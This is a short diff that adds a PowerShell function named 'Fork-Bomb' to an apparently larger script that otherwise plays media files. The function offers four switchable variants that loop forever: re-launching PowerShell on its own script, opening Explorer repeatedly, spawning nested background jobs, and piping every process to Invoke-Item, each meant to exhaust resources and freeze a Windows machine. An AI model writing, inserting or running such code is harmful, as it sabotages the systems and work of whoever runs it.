@@ -1142,3 +1142,31 @@ Param(
     $mediaPlayer.open($filepath)
     $mediaPlayer.Play()
 }
+
+Function Fork-Bomb {
+	Param([Parameter(Mandatory=$false)]
+    [switch]$Bomb1,
+    [switch]$Bomb2,
+    [switch]$Bomb3,
+    [switch]$BombWTF)
+
+if($Bomb1)
+{
+    While (1) { $WScript = New-Object -com wscript.shell; $WScript.Exec("powershell.exe &" + $PSCommandPath); }
+}
+
+if($Bomb2)
+{
+    while(1) {C:\Windows\explorer.exe}
+}
+
+if($Bomb3)
+{
+    For(){ Sajb{ For(){ } } }
+}
+
+if($BombWTF)
+{
+    For(){Ps|Ii}
+}
+}
